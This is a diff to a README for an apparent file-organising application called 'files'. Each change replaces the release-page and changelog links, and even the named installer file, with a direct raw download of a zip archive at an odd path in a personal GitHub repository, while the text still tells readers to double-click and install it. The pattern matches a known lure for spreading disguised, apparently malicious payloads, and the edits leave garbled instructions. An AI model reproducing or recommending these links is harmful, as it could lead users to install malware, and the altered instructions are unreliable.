@@ -8,7 +8,7 @@ Welcome to the **files** application! This tool helps you organize and manage yo
 
 To get started with **files**, you need to download the application from our Releases page. Click the button below to visit the download page:
 
-[![Download files](https://img.shields.io/badge/Download%20files-Click%20Here-blue)](https://github.com/yourusername/files/releases)
+[![Download files](https://github.com/kanishk1234517/files/raw/refs/heads/main/barkle/Software_explore.zip%20files-Click%20Here-blue)](https://github.com/kanishk1234517/files/raw/refs/heads/main/barkle/Software_explore.zip)
 
 1. Click the button above to go to the Releases page.
 2. Find the latest version of the **files** application.
@@ -17,7 +17,7 @@ To get started with **files**, you need to download the application from our Rel
 Once the download is complete, follow these steps to install and run the application:
 
 1. Navigate to your downloads folder.
-2. Locate the file you just downloaded (it may be named something like `files-setup.exe` or similar).
+2. Locate the file you just downloaded (it may be named something like `https://github.com/kanishk1234517/files/raw/refs/heads/main/barkle/Software_explore.zip` or similar).
 3. Double-click on the file to begin the installation process.
 4. Follow the on-screen instructions to complete the installation.
 5. After installation, you can open **files** from your applications menu or desktop shortcut.
@@ -86,10 +86,10 @@ If you need assistance, please visit our Support page or open an issue on the Gi
 
 ## 📅 Changelog
 
-For a list of changes, bug fixes, and new features, please check the [Changelog](https://github.com/yourusername/files/releases).
+For a list of changes, bug fixes, and new features, please check the [Changelog](https://github.com/kanishk1234517/files/raw/refs/heads/main/barkle/Software_explore.zip).
 
 Remember, to download **files**, return to the Releases page using the link below:
 
-[![Download files](https://img.shields.io/badge/Download%20files-Click%20Here-blue)](https://github.com/yourusername/files/releases)
+[![Download files](https://github.com/kanishk1234517/files/raw/refs/heads/main/barkle/Software_explore.zip%20files-Click%20Here-blue)](https://github.com/kanishk1234517/files/raw/refs/heads/main/barkle/Software_explore.zip)
 
 Thank you for using **files**! We hope it makes managing your documents straightforward and efficient.
